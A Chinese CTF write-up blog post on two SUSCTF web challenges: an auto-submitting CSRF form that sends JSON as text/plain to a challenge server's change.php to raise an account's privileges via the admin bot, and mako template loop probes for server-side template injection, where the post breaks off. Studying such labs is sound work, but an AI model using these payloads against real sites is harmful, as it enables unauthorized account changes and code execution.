---
title: susctf
date: 2022-1-27 15:10:33
tags: CSRF
categories: 比赛题目复现
top_img: https://images.wallpaperscraft.com/image/single/path_fog_trees_125481_1280x720.jpg
cover: https://images3.alphacoders.com/109/thumbbig-109167.webp
---

# fxxkcors

考点：

```
1.CSRF
```

有个js附件下载下来，据说其内容是用**puppeteer**去模拟浏览器登录，然后访问我们给定的链接(原理并不清晰)

![image-20220304105119151](C:\Users\Windflower\AppData\Roaming\Typora\typora-user-images\image-20220304105119151.png)

在登陆后有个提示

![image-20220304105206612](C:\Users\Windflower\AppData\Roaming\Typora\typora-user-images\image-20220304105206612.png)

只需要更改权限为`normal admin`就能拿到flag，不是admin登陆的不能修改权限

![image-20220304105321486](C:\Users\Windflower\AppData\Roaming\Typora\typora-user-images\image-20220304105321486.png)

## 解题思路

构造CSRF，参考[浅谈CSRF](https://www.jianshu.com/p/7f33f9c7997b)，然后利用题目提供的Admin report访问进行CSRF权限提升

还需注意要使Content-Type: text/plain，然后body中是json数据，原因是因为服务没有验证 JSON 的 content-type

表单

```html
<form id=a action="http://124.71.205.122:10002/change.php" method="POST" enctype="text/plain">
<input name='{"username":"fweewfwef", "abc":"' value='123"}'>
</form>
<script> a.submit(); </script> 
```

# HTML practice

提交`##`会使页面为空，后面发现是**[mako](https://blog.csdn.net/baidu_35085676/article/details/80560847)**框架

利用mako框架的循环来验证

```python
% for i in l:
    ${i}
% endfor
```

```python
% for i in (1,2,3):
    2
% endfor
```

页面渲染了3个2，确定是mako框架，后翻阅文档.....